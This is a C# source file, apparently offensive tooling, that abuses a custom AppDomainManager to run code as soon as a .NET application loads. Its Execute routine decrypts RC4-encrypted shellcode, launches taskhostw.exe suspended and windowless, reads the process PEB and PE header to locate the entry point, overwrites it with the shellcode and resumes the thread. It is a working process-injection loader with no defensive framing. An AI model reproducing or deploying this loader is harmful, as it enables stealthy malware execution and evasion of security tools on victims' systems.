using System;
using System.Runtime.InteropServices;
using static MyAppDomainManager;

public sealed class MyAppDomainManager : AppDomainManager
{


    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {

        // https://learn.microsoft.com/en-us/dotnet/api/system.appdomainsetup.disallowcodedownload?view=netframework-4.8.1
        // appDomainInfo.DisallowCodeDownload = true;

        // Read command line arguments
        string[] CmdLine = Environment.GetCommandLineArgs();

        // Run our magic function
        ClassExample.Execute(CmdLine);

        return;
    }
}

public class ClassExample
{
    [Flags]
    public enum ProcessCreationFlags : uint
    {
        ZERO_FLAG = 0x00000000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NEW_CONSOLE = 0x00000010,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_NO_WINDOW = 0x08000000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_SEPARATE_WOW_VDM = 0x00001000,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_SUSPENDED = 0x00000004,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        DEBUG_PROCESS = 0x00000001,
        DETACHED_PROCESS = 0x00000008,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        INHERIT_PARENT_AFFINITY = 0x00010000
    }

    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniquePID;
        public IntPtr InheritedFromUniqueProcessId;
    }

    public const int PROCESSBASICINFORMATION = 0;

    [DllImport("kernel32", SetLastError = true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
                             bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
                            string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32", SetLastError = true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out IntPtr lpNumberOfBytesWritten);

    [DllImport("ntdll")]
    public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

    [DllImport("kernel32")]
    public static extern uint ResumeThread(IntPtr hThread);

     public static void Execute(String[] Args)
    {

        STARTUPINFO sInfo = new STARTUPINFO();
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
        IntPtr bytesRead = IntPtr.Zero;
        IntPtr bytesWritten = IntPtr.Zero;
        uint retLength = 0;
        const string targetProcess = "C:\\Windows\\System32\\taskhostw.exe";


        // Decrypt the RC4-encrypted shellcode (shellcode.cs) before the injection logic.
        byte[] Shc = Shellcode.Decrypt();

        sInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
        if (!CreateProcess(targetProcess, "taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}", IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, @"C:\WINDOWS\System32\", ref sInfo, out pInfo))
            return;

        // Walk the PEB of the suspended process to get its image base.
        if (ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbi, (uint)(IntPtr.Size * 6), ref retLength) != 0)
            return;

        IntPtr imageBaseField = (IntPtr)((Int64)pbi.PebAddress + 0x10);
        byte[] imageBaseBytes = new byte[IntPtr.Size];
        if (!ReadProcessMemory(pInfo.hProcess, imageBaseField, imageBaseBytes, imageBaseBytes.Length, out bytesRead))
            return;
        IntPtr imageBase = (IntPtr)BitConverter.ToInt64(imageBaseBytes, 0);

        // Parse the PE header to find the entry point RVA.
        byte[] headers = new byte[0x200];
        if (!ReadProcessMemory(pInfo.hProcess, imageBase, headers, headers.Length, out bytesRead))
            return;

        uint e_lfanew = BitConverter.ToUInt32(headers, 0x3C);
        uint entryPointRva = BitConverter.ToUInt32(headers, (int)(e_lfanew + 0x28));
        IntPtr entryPoint = (IntPtr)((Int64)imageBase + entryPointRva);

        // Overwrite the entry point with the decrypted shellcode and resume the thread.
        if (!WriteProcessMemory(pInfo.hProcess, entryPoint, Shc, Shc.Length, out bytesWritten))
            return;

        ResumeThread(pInfo.hThread);

        return;

    }

}
